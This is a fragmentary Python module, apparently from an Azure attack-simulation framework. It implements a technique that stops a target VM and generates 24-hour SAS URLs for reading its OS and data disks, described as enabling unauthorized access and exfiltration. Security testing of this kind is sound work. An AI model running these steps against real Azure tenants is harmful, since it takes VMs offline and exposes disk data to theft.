...
class AzureGenerateVMDiskSASUrl(BaseTechnique):
    def __init__(self):
        ...
        super().__init__(
            "Generate VM Disk SAS URL",
            "Generates SAS tokens to gain unauthorized access to Azure VM disk contents. This technique allows an attacker to create time-limited access tokens for both OS and data disks attached to virtual machines, enabling potential data exfiltration. The technique first deallocates the target VM if running, then generates SAS URIs with read permissions valid for 24 hours.",
            mitre_techniques,
            azure_trm_techniques,
        )
        ...
        try:
            ...
            try:
                if vm_status != "PowerState/deallocated":
                    print(
                        f"VM {vm_name} is not stopped. Current state: {vm_status}. Stopping the VM..."
                    )
            ...
            if os_disk:
                try:
                    disk_resource = compute_client.disks.get(
                        rg_name, disk_name=os_disk.name
                    )
                    ...
                    if sas_token.access_sas:
                        print(
                            f"Successfully got a link for OS data_disk {os_disk.name}. Link is active for 24 hours."
                        )
                        sas_tokens["os_disk"][os_disk.name] = sas_token.access_sas
                except Exception as e:
                    sas_tokens["os_disk"][os_disk.name] = (
                        f"Error generating SAS token for OS data_disk {os_disk.name}: {e}"
                    )
            ...
            for data_disk in data_disks:
                try:
                    disk_resource = compute_client.disks.get(
                        rg_name, disk_name=data_disk.name
                    )
                    sas_token = compute_client.disks.begin_grant_access(
                        resource_group_name=disk_resource.id.split("/")[4],
                    ...
                    if sas_token.access_sas:
                        print(
                            f"Successfully got a link for data data_disk {data_disk.name}. Link is active for 24 hours."
                        )
                        sas_tokens["data_disks"][data_disk.name] = sas_token.access_sas
                except Exception as e:
                    sas_tokens["os_disk"][data_disk.name] = (
                        f"Error generating SAS token for OS data_disk {data_disk.name}: {e}"
                    )

            if sas_tokens["os_disk"] or sas_tokens["data_disks"]:
                return ExecutionStatus.SUCCESS, {
                    "message": "Successfully generated SAS token for VM",
                    "value": sas_tokens,
                }
            else:
